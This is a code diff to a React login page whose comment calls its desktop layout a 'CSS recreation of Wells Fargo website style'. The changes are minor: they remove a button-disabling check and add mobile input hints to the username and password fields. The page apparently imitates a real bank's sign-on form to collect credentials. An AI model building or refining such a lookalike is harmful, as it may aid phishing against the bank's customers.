@@ -144,14 +144,6 @@ export default function LoginPage() {
     loginMutation.mutate(data);
   };
 
-  // Track if form has credentials for button state - using getValues instead of watch to reduce re-renders
-  const [formHasCredentials, setFormHasCredentials] = useState(false);
-  
-  // Update button state when form values change
-  const updateCredentialsState = () => {
-    const values = form.getValues();
-    setFormHasCredentials(Boolean(values.username && values.password));
-  };
 
 
   // Desktop Layout - CSS recreation of Wells Fargo website style
@@ -276,10 +268,6 @@ export default function LoginPage() {
                           className="h-12 px-4 text-base border-2 border-gray-300 rounded focus:border-[#d71e28] focus:ring-0"
                           data-testid="desktop-input-username"
                           {...field}
-                          onChange={(e) => {
-                            field.onChange(e);
-                            setTimeout(updateCredentialsState, 0);
-                          }}
                         />
                       </FormControl>
                       <FormMessage />
@@ -301,10 +289,6 @@ export default function LoginPage() {
                             className="h-12 px-4 pr-16 text-base border-2 border-gray-300 rounded focus:border-[#d71e28] focus:ring-0"
                             data-testid="desktop-input-password"
                             {...field}
-                            onChange={(e) => {
-                              field.onChange(e);
-                              setTimeout(updateCredentialsState, 0);
-                            }}
                           />
                           <button
                             type="button"
@@ -611,11 +595,9 @@ export default function LoginPage() {
                       spellCheck={false}
                       className="h-14 px-4 text-lg border-2 border-gray-300 rounded-lg focus:border-[#d71e28] focus:ring-0 bg-white placeholder:text-gray-400"
                       data-testid="input-username"
+                      inputMode="text"
+                      enterKeyHint="next"
                       {...field}
-                      onChange={(e) => {
-                        field.onChange(e);
-                        setTimeout(updateCredentialsState, 0);
-                      }}
                     />
                   </FormControl>
                   <FormMessage />
@@ -637,11 +619,9 @@ export default function LoginPage() {
                         autoComplete="current-password"
                         className="h-14 px-4 pr-16 text-lg border-2 border-gray-300 rounded-lg focus:border-[#d71e28] focus:ring-0 bg-white placeholder:text-gray-400"
                         data-testid="input-password"
+                        inputMode="text"
+                        enterKeyHint="go"
                         {...field}
-                        onChange={(e) => {
-                          field.onChange(e);
-                          setTimeout(updateCredentialsState, 0);
-                        }}
                       />
                       <button
                         type="button"
@@ -662,12 +642,8 @@ export default function LoginPage() {
             <div className="pt-4">
               <Button
                 type="submit"
-                className={`w-full h-14 font-semibold rounded-full text-lg transition-all ${
-                  formHasCredentials 
-                    ? "bg-[#ffcd41] hover:bg-[#e6b938] text-[#1a1a1a]" 
-                    : "bg-[#e5e5e5] text-gray-400 cursor-not-allowed"
-                }`}
-                disabled={loginMutation.isPending || !formHasCredentials}
+                className="w-full h-14 font-semibold rounded-full text-lg transition-all bg-[#ffcd41] hover:bg-[#e6b938] text-[#1a1a1a]"
+                disabled={loginMutation.isPending}
                 data-testid="button-sign-on"
               >
                 {loginMutation.isPending ? "Signing on..." : "Sign on"}
